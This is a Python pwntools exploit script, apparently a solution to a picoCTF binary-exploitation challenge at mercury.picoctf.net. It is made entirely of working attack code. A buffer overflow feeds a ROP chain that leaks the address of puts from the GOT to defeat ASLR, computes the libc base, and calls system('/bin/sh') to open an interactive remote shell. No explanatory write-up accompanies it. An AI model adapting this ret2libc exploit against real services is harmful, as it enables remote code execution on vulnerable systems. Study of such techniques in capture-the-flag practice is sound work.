from pwn import *

address = 'mercury.picoctf.net'
port = 49464

context.binary = binary = ELF('./vuln')
rop = ROP(binary)

ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

puts_plt = binary.plt.puts
puts_got = binary.got.puts
main = binary.symbols.main
overflow = b'A' * 128

puts_offset = 0x80a30
system_offset = 0x4f4e0
bin_sh_offset = 0x1b40fa

payload = overflow
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

target = remote(address, port)

target.recvline()
target.sendline(payload)
target.recvline()

puts_libc = u64(target.recvline().strip().ljust(8, b'\x00'))
success(f'Puts LIBC: {hex(puts_libc)}')

libc_base = puts_libc - puts_offset
success(f'LIBC Base Address: {hex(libc_base)}')

system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

payload = overflow
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

target.sendline(payload)
target.recvline()
target.recvline()
target.interactive()
